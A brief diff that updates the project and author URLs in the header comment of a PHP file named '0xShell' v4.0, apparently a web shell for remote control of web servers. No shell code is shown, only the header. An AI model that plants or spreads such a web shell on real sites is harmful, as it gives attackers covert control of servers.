@@ -4,9 +4,9 @@ set_time_limit(0);
 
 /* *
  * 
- * 0xShell ~ http://0xproject.netsons.org/#0xShell
+ * 0xShell ~ http://www.luongovincenzo.it/0xProject/#0xShell
  *
- * Autore: KinG-InFeT [ http://www.kinginfet.net/ ]
+ * Autore: KinG-InFeT [ http://www.luongovincenzo.it/ ]
  * Licenza: GNU/GPL
  * Versione: v4.0
  *
